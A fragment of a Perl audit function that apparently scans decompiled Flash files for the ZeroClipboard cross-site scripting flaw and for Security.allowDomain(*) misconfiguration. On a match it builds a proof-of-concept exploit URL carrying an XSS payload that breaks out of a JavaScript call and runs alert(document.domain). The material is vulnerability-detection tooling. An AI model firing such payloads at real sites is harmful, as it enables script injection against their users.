...
sub asdecAudit(){
    ...
    # ZeroClipboard Flash XSS
    my @zeroclip = readpipe("grep -n \'function ZeroClipboard\(\)\' -R tmp/$name");
    my @loaderinfo = readpipe("grep -n \'LoaderInfo\(this\.root\.loaderInfo\)\.parameters\' -R tmp/$name");
    my @flashvar = readpipe("grep -n \'id\=flashvars\.id\' -R tmp/$name");
    my @call = readpipe("grep -n \'ExternalInterface.call(\"ZeroClipboard.dispatch\"\,id\,\"load\"\,null\)\' -R tmp/$name");
    if(@zeroclip && @loaderinfo && @flashvar ){
        my $exploit = "$target?id=\\%22))}catch(e){(alert)(document.domain)\;}//&width=500&height=500";
        push(@result, "【漏洞】【$target】: \n @zeroclip @loaderinfo @flashvar @call\n 【Exploit】: $exploit\n\n");
    }

    # Security.allowDomain(*)问题
    my @allowDomain =  readpipe("grep -n \'Security\.allowDomain\(\*\)\' -R tmp/$name");
    if(@allowDomain){   	
    	push(@result, "【漏洞】【$target】：\n @allowDomain\n\n");
    }
}
